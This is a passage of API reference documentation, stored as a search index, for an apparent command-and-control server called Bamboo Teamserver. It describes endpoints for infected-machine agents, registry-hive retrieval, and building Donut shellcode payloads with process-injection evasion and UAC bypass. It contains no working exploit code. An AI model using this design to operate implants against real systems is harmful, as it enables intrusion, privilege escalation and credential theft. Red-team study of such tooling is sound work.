/agent/post_exploit/enumerate\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#description_5","title":"Description","text":"<p>Enumerate Result will be called by Bamboo Agent when Bamboo Client command the Bamboo Agent to enumerate the infected machine. There will be error checking to determine if there were any error, if there are no errors, Bamboo Teamserver will send the enumerate results to the user via WebSocket.</p>"},{"location":"Teamserver_API_Reference/agent.html#request-schema_4","title":"Request schema","text":"Request body Field Type Description agent_identifier String Identifier of Bamboo Agent status String State of agent: <code>done</code>, <code>error</code> result String Enumerate Result handler String Bamboo Client user that started the keylogging error String If status is error, will state error"},{"location":"Teamserver_API_Reference/agent.html#request-example_4","title":"Request example","text":"Text Only<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"status\": \"done\":,\n    \"result\": &lt;a very long list of string&gt;,\n    \"handler\": \"Bamboo User A\",\n    \"error\": \"\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#response-schema_5","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"success\"} Successfully sent broadcasted to Bamboo Client <code>400</code> {\"message\": \"failed\"} Failed to broadcast to Bamboo Client <code>404</code> {\"message\": \"error\"} There was an error when enumerating"},{"location":"Teamserver_API_Reference/agent.html#response-example_4","title":"Response example","text":"Text Only<pre><code>{\n    \"message\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#websocket-schema_1","title":"WebSocket schema","text":"Websocket body Field Type Description enumerateMsg String Enumerated result agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver_API_Reference/agent.html#websocket-example_1","title":"WebSocket example","text":"Text Only<pre><code>{\n    \"enumerateMsg\": &lt;a very long list of string&gt;,\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#sss_retrieve-result","title":"SSS_Retrieve Result","text":"<p>Store SSS_Retrieve (<code>retrieve</code>) result</p>"},{"location":"Teamserver_API_Reference/agent.html#endpoint_6","title":"Endpoint","text":"Text Only<pre><code>POST /agent/post_exploit/sss_retrieve\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#description_6","title":"Description","text":"<p>SSS_Retrieve Result will be called by Bamboo Agent when Bamboo Client command the Bamboo Agent to Retrieve registry hives from the infected machine. There will be error checking to determine if there were any error, if there are no errors, Bamboo Teamserver will send the retrieved results to the user via WebSocket.</p>"},{"location":"Teamserver_API_Reference/agent.html#request-schema_5","title":"Request schema","text":"Request body Field Type Description agent_identifier String Identifier of Bamboo Agent status String State of agent: <code>done</code>, <code>error</code> files String Dictionary of binary handler String Bamboo Client user that started the keylogging error String If status is error, will state error"},{"location":"Teamserver_API_Reference/agent.html#request-example_5","title":"Request example","text":"Text Only<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"status\": \"done\":,\n    \"result\": &lt;dictionary of binary&gt;,\n    \"handler\": \"Bamboo User A\",\n    \"error\": \"\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#response-schema_6","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"success\"} Successfully sent broadcasted to Bamboo Client <code>400</code> {\"message\": \"failed\"} Failed to broadcast to Bamboo Client <code>404</code> {\"message\": \"error\"} There was an error when enumerating"},{"location":"Teamserver_API_Reference/agent.html#response-example_5","title":"Response example","text":"Text Only<pre><code>{\n    \"message\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#websocket-schema_2","title":"WebSocket schema","text":"Websocket body Field Type Description retrieveMsg String Enumerated result agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver_API_Reference/agent.html#websocket-example_2","title":"WebSocket example","text":"Text Only<pre><code>{\n    \"retrieveMsg\": &lt;dictionary of binary&gt;,\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/authentication.html","title":"/auth","text":""},{"location":"Teamserver_API_Reference/authentication.html#server-status","title":"Server Status","text":"<p>Check if server is up</p>"},{"location":"Teamserver_API_Reference/authentication.html#endpoint","title":"Endpoint","text":"Text Only<pre><code>POST /auth/\n</code></pre>"},{"location":"Teamserver_API_Reference/authentication.html#description","title":"Description","text":"<p>Bamboo Client will always request for this endpoint before requesting for credentials. A simple endpoint that allows Bamboo Client to determine if the Bamboo Teamserver hosted in the address input is online.</p>"},{"location":"Teamserver_API_Reference/authentication.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"online\"} Server is online"},{"location":"Teamserver_API_Reference/authentication.html#response-example","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"online\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/authentication.html#user-login","title":"User Login","text":"<p>Authenticates user credentials for access</p>"},{"location":"Teamserver_API_Reference/authentication.html#endpoint_1","title":"Endpoint","text":"Text Only<pre><code>POST /auth/login\n</code></pre>"},{"location":"Teamserver_API_Reference/authentication.html#description_1","title":"Description","text":"<p>This endpoint validates the credential sent by the user from Bamboo Client. Using the <code>model login_auth</code>, Bamboo Teamserver will determine if the credentials are valid. If it is valid, Bamboo Teamserver will generate a JSON Web Token (JWT) for the Bamboo Client user and respond back to the user.</p>"},{"location":"Teamserver_API_Reference/authentication.html#request-schema","title":"Request schema","text":"Request body Field Type Description username String Username input by user password String Password input by user"},{"location":"Teamserver_API_Reference/authentication.html#request-example","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"password\": \"adnap\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/authentication.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"message\": \"Login successful\", \"jwt_token\": jwt_token} Successfully Login <code>400</code> {\"status\": \"error\", \"message\": \"User not found\"} Invalid Username <code>401</code> {\"status\": \"error\", \"message\": \"Incorrect password\"} Incorrect Password <code>404</code> {\"status\": \"error\", \"message\": \"Something went wrong!\"} Invalid Body"},{"location":"Teamserver_API_Reference/authentication.html#response-example_1","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\",\n    \"message\": \"Login successful\",\n    \"jwt_token\": jwt_token\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/authentication.html#user-logout","title":"User Logout","text":"<p>Notifies Bamboo Teamserver that user have log out</p>"},{"location":"Teamserver_API_Reference/authentication.html#endpoint_2","title":"Endpoint","text":"Text Only<pre><code>POST /auth/logout\n</code></pre>"},{"location":"Teamserver_API_Reference/authentication.html#description_2","title":"Description","text":"<p>This endpoint is called when the Bamboo Client user want to log off using <code>exit</code>/<code>quit</code> command. Bamboo Teamserver will update the user status in the database using the <code>model users</code> and will generate a log. Bamboo Teamserver will also remove the username from the WebSocket Client dictionary.</p>"},{"location":"Teamserver_API_Reference/authentication.html#request-schema_1","title":"Request schema","text":"Request body Field Type Description username String Username of user"},{"location":"Teamserver_API_Reference/authentication.html#request-example_1","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/authentication.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"logout\"} Successfully Logout <code>404</code> {\"message\": \"failed\"} Invalid Body"},{"location":"Teamserver_API_Reference/authentication.html#response-example_2","title":"Response example","text":"Text Only<pre><code>{\n    \"message\": \"logout\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/authentication.html#check-agent-status","title":"Check Agent Status","text":"<p>Determing agent status and return back to Bamboo Client</p>"},{"location":"Teamserver_API_Reference/authentication.html#endpoint_3","title":"Endpoint","text":"Text Only<pre><code>POST /auth/check_agent_status\n</code></pre>"},{"location":"Teamserver_API_Reference/authentication.html#description_3","title":"Description","text":"<p>When Bamboo Client user uses commands such as {<code>exploit</code> and <code>cmd</code>}, Bamboo Client will need to determine if the Bamboo Agent in use is online. This endpoint uses the <code>model obtain_status</code> and will return the status of the specific Bamboo Agent.</p>"},{"location":"Teamserver_API_Reference/authentication.html#request-schema_2","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver_API_Reference/authentication.html#request-example_2","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/authentication.html#response-schema_3","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"agent_status\": agent_status} Successfully Logout <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver_API_Reference/authentication.html#response-example_3","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\",\n    \"agent_status\": \"online\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html","title":"/exploit","text":""},{"location":"Teamserver_API_Reference/exploit.html#stop-exploit","title":"Stop Exploit","text":"<p>Stop exploit process. For logging purposes</p>"},{"location":"Teamserver_API_Reference/exploit.html#endpoint","title":"Endpoint","text":"Text Only<pre><code>POST /exploit/quit\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#description","title":"Description","text":"<p>When a Bamboo Client user wants to stop the process of exploiting a Bamboo Agent, Bamboo Client will call this endpoint to notify Bamboo Teamserver about it, for logging purposes.</p>"},{"location":"Teamserver_API_Reference/exploit.html#request-schema","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver_API_Reference/exploit.html#request-example","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"stopped\"} Successfully notified <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver_API_Reference/exploit.html#response-example","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"stopped\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#exploit-agent","title":"Exploit Agent","text":"<p>Handles configuration sent from Bamboo Client to produce a valid payload to Bamboo Agent</p>"},{"location":"Teamserver_API_Reference/exploit.html#endpoint_1","title":"Endpoint","text":"Text Only<pre><code>POST /exploit/send_config\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#description_1","title":"Description","text":"<p>Exploit Agent is called after a Bamboo Client user finish configuring the exploit to use on the Bamboo Agent. Bamboo Teamserver will first convert the selected evasion method into a standardised one. Next, it will perform a sequence of logic which can be seen in the flowchart below. If Donut is required, Bamboo Teamserver will run the Donut function with the given Donut configuration input by the user. The Donut function will turn the exploit into shellcode before converting the shellcode into hexadecimals. Finally, Bamboo Teamserver will broadcast a WebSocket message to the Bamboo Agent using its agent identifier to give it its command.</p> <p></p>"},{"location":"Teamserver_API_Reference/exploit.html#request-schema_1","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent need_donut Boolean Determines if Donut is required exploit_to_use String Exploit name evasion_method String Evasion method choosen app_version String Version of is affected by exploit uac_bypass Boolean Determines if payload require uac_bypass donut_config_data List of Integers Donut configurations (if applicable) file2donut String File name to generate shellcode using Donut (if applicable)"},{"location":"Teamserver_API_Reference/exploit.html#request-example_1","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"need_donut\": True,\n    \"exploit_to_use\": \"filmora.exe\",\n    \"evasion_method\": \"Process Injection [Injection]\",\n    \"app_version\": \"Wondershare Filmora v11\",\n    \"uac_bypass\": True,\n    \"donut_config_data\": [3, 2, 1, 2],\n    \"file2donut\": \"uac_bypass.exe\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully notified <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"Teamserver_API_Reference/exploit.html#response-example_1","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#websocket-schema","title":"WebSocket schema","text":"Websocket body Field Type Description app_version String App version that exploit targets command String exploit method String Evasion method for uac_bypass/exploit shellcode String Hexadecimal of exploit file drop_file String File to download from Bamboo Teamserver uac_bypass String If uac_bypass is needed, will contain evasion method. Else an empty string"},{"location":"Teamserver_API_Reference/exploit.html#websocket-example","title":"WebSocket example","text":"Text Only<pre><code>{\n    \"app_version\": \"Bamboooo\",\n    \"command\": \"exploit\",\n    \"method\": \"Gadget Injection\",\n    \"shellcode\": &lt;Exploit shellcode in Hexadecimal&gt;,\n    \"drop_file\": \"\",\n    \"uac_bypass\": \"\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#view-exploits","title":"View Exploits","text":"<p>View all exploits</p>"},{"location":"Teamserver_API_Reference/exploit.html#endpoint_2","title":"Endpoint","text":"Text Only<pre><code>POST /exploit/view_all\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#description_2","title":"Description","text":"<p>When Bamboo Client uses the {command <code>exp</code>}, Bamboo Teamserver will gather all exploits in the database using the <code>model view_all</code> and returns it back to Bamboo Client.</p>"},{"location":"Teamserver_API_Reference/exploit.html#request-schema_2","title":"Request schema","text":"Request body Field Type Description username String Username of user"},{"location":"Teamserver_API_Reference/exploit.html#request-example_2","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"exploit_data\": exploit_data} Successful and there are exploits <code>200</code> {\"status\": \"failed\", \"exploit_data\": exploit_data} Successful but no exploits <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver_API_Reference/exploit.html#response-example_2","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\",\n    \"exploit_data\": &lt;dictionary of exploit data&gt;\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#add-exploits","title":"Add Exploits","text":"<p>Add new exploit</p>"},{"location":"Teamserver_API_Reference/exploit.html#endpoint_3","title":"Endpoint","text":"Text Only<pre><code>POST /exploit/add\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#description_3","title":"Description","text":"<p>When Bamboo Client uses the {command <code>add</code>}, Bamboo Teamserver will upload the new exploit information into the database using the <code>model add_exploit</code>. Additionally, using <code>request.files</code>, Bamboo Teamserver will place the exploit file into /exploit folder.</p>"},{"location":"Teamserver_API_Reference/exploit.html#request-schema_3","title":"Request schema","text":"Request body Field Type Description username String Username of user configurations List Contains information of new exploit files Bytes Bytes of new exploit file (not sent in request body)"},{"location":"Teamserver_API_Reference/exploit.html#request-example_3","title":"Request example","text":"Request body Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"configurations\": [\"newExploit.exe\", \"app_version_Bamboo\", \"user\", \"system\", False, True, True, \"\"]\n}\n</code></pre> multipart/form-data Text Only<pre><code>{\n    \"file\": &lt;file bytes&gt;\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#response-schema_3","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully added new exploit <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"staus\": \"failed\"} Failed to add into database <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"Teamserver_API_Reference/exploit.html#response-example_3","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#delete-exploits","title":"Delete Exploits","text":"<p>Delete a exploit</p>"},{"location":"Teamserver_API_Reference/exploit.html#endpoint_4","title":"Endpoint","text":"Text Only<pre><code>POST /exploit/delete\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#description_4","title":"Description","text":"<p>When Bamboo Client uses the {command: <code>delete</code>}, Bamboo Teamserver will attempt to remove the exploit specified by the Bamboo Client user using the <code>model del_exploit</code>. Bamboo Teamserver will remove the information related to the exploit stored in the database, as well as the file stored in Bamboo Teamserver under the /exploits folder.</p>"},{"location":"Teamserver_API_Reference/exploit.html#request-schema_4","title":"Request schema","text":"Request body Field Type Description username String Username of user exploit_name String Name of exploit to delete"},{"location":"Teamserver_API_Reference/exploit.html#request-example_4","title":"Request example","text":"Request body Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"exploit_name\": \"filmora.exe\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#response-schema_4","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully deleted specified exploit <code>200</code> {\"staus\": \"does not exist\"} No such exploit exist in the database <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver_API_Reference/exploit.html#response-example_4","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#exploit-existence","title":"Exploit Existence","text":"<p>Determine if an exploit exist in Bamboo Teamserver</p>"},{"location":"Teamserver_API_Reference/exploit.html#endpoint_5","title":"Endpoint","text":"Text Only<pre><code>POST /exploit/exist\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#description_5","title":"Description","text":"<p>Exploit Existence is used for when the {command <code>modify</code>} is called in the Bamboo Client. This endpoint will help determine if a exploit exist in Bamboo Teamserver and return the exploit information if it exist before allowing the Bamboo Client users to start making changes. It uses the <code>model find_one</code> to locate the specified exploit.</p>"},{"location":"Teamserver_API_Reference/exploit.html#request-schema_5","title":"Request schema","text":"Request body Field Type Description username String Username of user exploit_name String Name of exploit to delete"},{"location":"Teamserver_API_Reference/exploit.html#request-example_5","title":"Request example","text":"Request body Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"exploit_name\": \"filmora.exe\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#response-schema_5","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"data\": data} Found the exploit in the database <code>200</code> {\"staus\": \"does not exist\"} No such exploit exist in the database <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver_API_Reference/exploit.html#response-example_5","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\",\n    \"data\": data\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#modify-exploit-cli","title":"Modify Exploit (CLI)","text":"<p>Modifies exploit specified</p>"},{"location":"Teamserver_API_Reference/exploit.html#endpoint_6","title":"Endpoint","text":"Text Only<pre><code>POST /exploit/modify\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#description_6","title":"Description","text":"<p>Modify Exploit is called when CLI Bamboo Client calls the {<code>modify</code> command}. The Bamboo Client will sent the set of changes to be made, which can vary in sizes and key depending on what needs to be modified. If the exploit name is to be modified, Bamboo Teamserver will change the exploit file name accordingly. Using the <code>model modify</code>, Bamboo Teamserver will be able to make dynamic changes to the information of the exploit stored in the database.</p>"},{"location":"Teamserver_API_Reference/exploit.html#request-schema_6","title":"Request schema","text":"Request body Field Type Description username String Username of user exploit_name String Name of exploit to modify changes Dictionary Dictionary of changes to be made (dynamic)"},{"location":"Teamserver_API_Reference/exploit.html#request-example_6","title":"Request example","text":"Request body Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"exploit_name\": \"filmora.exe\"\n    \"changes\": {\n        \"name\": \"new_name.exe\", \n        \"app_version\": \"new_app_version\"\n    }\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#response-schema_6","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully modified specified exploit <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"staus\": \"failed\"} Something went wrong"},{"location":"Teamserver_API_Reference/exploit.html#response-example_6","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#modify-exploit-gui","title":"Modify Exploit (GUI)","text":"<p>Modifies exploit specified</p>"},{"location":"Teamserver_API_Reference/exploit.html#endpoint_7","title":"Endpoint","text":"Text Only<pre><code>POST /exploit/modify_gui\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#description_7","title":"Description","text":"<p>Modify Exploit is called when GUI Bamboo Client calls the {<code>modify</code> command}. As Bamboo Client GUI will push all information to Bamboo Teamserver no matter if they were modified, a new endpoint was created to cater to it. Similar to the previous Endpoint, if the name of the exploit to be modified changes its name, the exploit file name will change as well. Using the <code>model modify_gui</code>, Bamboo Teamserver will be able to update the information of the exploit all together.</p>"},{"location":"Teamserver_API_Reference/exploit.html#request-schema_7","title":"Request schema","text":"Request body Field Type Description username String Username of user modified_exploit_name String Name of exploit to modify new_name String New exploit name new_app_version String New app version new_LPE_start String New Privilege Escalation Start new_LPE_end String New Privilege Escalation End new_uac_bypass Boolean New uac_bypass requirement new_d2d Boolean New drop-to-disk requirement new_inj Boolean New injection requirement new_dropfile Boolean New dropfile requirement"},{"location":"Teamserver_API_Reference/exploit.html#request-example_7","title":"Request example","text":"Request body Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"modified_exploit_name\": \"filmora.exe\"\n    \"new_name\": \"Pandaaa.exe\",\n    \"modified_exploit_name\": \"for pandas\",\n    \"new_LPE_start\": \"admin\",\n    \"new_LPE_end\": \"system\",\n    \"new_uac_bypass\": True,\n    \"new_d2d\": True,\n    \"new_inj\": True,\n    \"new_dropfile\" \"Pandaaa.exe\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/exploit.html#response-schema_7","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully modified specified exploit <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"staus\": \"failed\"} Something went wrong"},{"location":"Teamserver_API_Reference/exploit.html#response-example_7","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html","title":"/handler_func","text":""},{"location":"Teamserver_API_Reference/handler_func.html#display-agents","title":"Display Agents","text":"<p>Extract all Bamboo Agent information from database</p>"},{"location":"Teamserver_API_Reference/handler_func.html#endpoint","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/agent/display\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#description","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to view all current Bamboo Agents registered in Bamboo Teamserver using the {command <code>display</code>}. Using the <code>model show_agents</code> and <code>model get_heartbeat</code>, Bamboo Teamserver will be able to extract all register Bamboo Agents information and status from the database.</p>"},{"location":"Teamserver_API_Reference/handler_func.html#request-schema","title":"Request schema","text":"Request body Field Type Description username String Username of user"},{"location":"Teamserver_API_Reference/handler_func.html#request-example","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"agent\": agent, \"heartbeat\": heartbeat} Success <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"Teamserver_API_Reference/handler_func.html#response-example","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\",\n    \"agent\": &lt;list of agent information&gt;,\n    \"heartbeat\": &lt;list of agent's heartbeat information&gt;\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#using-agents","title":"Using Agents","text":"<p>Extract specified agent information</p>"},{"location":"Teamserver_API_Reference/handler_func.html#endpoint_1","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/use_agent\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#description_1","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to start using a Bamboo Agent to interact with using the {command <code>use [agent]</code>}. Using the <code>model use_agent</code>, Bamboo Teamserver will be able to identify if the Bamboo Agent specified exist. If it does, the data of that Bamboo Agent will be return.</p>"},{"location":"Teamserver_API_Reference/handler_func.html#request-schema_1","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver_API_Reference/handler_func.html#request-example_1","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"agent_data\": agent_data} Success <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"Teamserver_API_Reference/handler_func.html#response-example_1","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\",\n    \"agent_data\": &lt;list of specified Bamboo Agent data&gt;\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#stop-using-agents","title":"Stop Using Agents","text":"<p>Stop using agents, for logging purposes</p>"},{"location":"Teamserver_API_Reference/handler_func.html#endpoint_2","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/stop_agent\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#description_2","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to stop using a Bamboo Agent using the {command <code>stop</code>}. It is for logging purposes</p>"},{"location":"Teamserver_API_Reference/handler_func.html#request-schema_2","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver_API_Reference/handler_func.html#request-example_2","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"stop\"} Success <code>404</code> {\"message\": \"failed\"} Invalid Body"},{"location":"Teamserver_API_Reference/handler_func.html#response-example_2","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\",\n    \"agent_data\": &lt;list of specified Bamboo Agent data&gt;\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#remove-agent","title":"Remove Agent","text":"<p>Remove specified Bamboo Agent</p>"},{"location":"Teamserver_API_Reference/handler_func.html#endpoint_3","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/remove_agent\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#description_3","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to remove a Bamboo Agent from Bamboo Teamserver using the {command <code>delete [agent]</code>}. Using the <code>model remove_agent</code>, Bamboo Teamserver will delete all instances of the specified Bamboo Agent if it exist. Additionally, if the Bamboo Agent is still running, Bamboo Teamserver will send a <code>kill</code> command to stop the Bamboo Agent.</p>"},{"location":"Teamserver_API_Reference/handler_func.html#request-schema_3","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver_API_Reference/handler_func.html#request-example_3","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#response-schema_3","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Success <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"fail\"} Invalid Body <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"Teamserver_API_Reference/handler_func.html#response-example_3","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#agent-information","title":"Agent Information","text":"<p>Retrieve a specific Bamboo Agent information</p>"},{"location":"Teamserver_API_Reference/handler_func.html#endpoint_4","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/info_status\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#description_4","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to the Bamboo Agent in use information using the {command <code>info</code>}. Using the <code>model info_status</code>, Bamboo Teamserver will be able to extract the information of the requested Bamboo Agent.</p>"},{"location":"Teamserver_API_Reference/handler_func.html#request-schema_4","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver_API_Reference/handler_func.html#request-example_4","title":"Request example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#response-schema_4","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"alive\"} Retrieved information and Bamboo is 'alive' <code>200</code> {\"status\": \"dead\"} Retrieved information and Bamboo is 'dead' <code>404</code> {\"status\": \"fail\"} Invalid Body <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"Teamserver_API_Reference/handler_func.html#response-example_4","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"alive\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#view-all-users","title":"View all Users","text":"<p>Retrieve all users in Bamboo Teamserver</p>"},{"location":"Teamserver_API_Reference/handler_func.html#endpoint_5","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/view_users\n</code></pre>"},{"location":"Teamserver_API_Reference/handler_func.html#description_5","title":"Description","text":"<p>This endpoint is 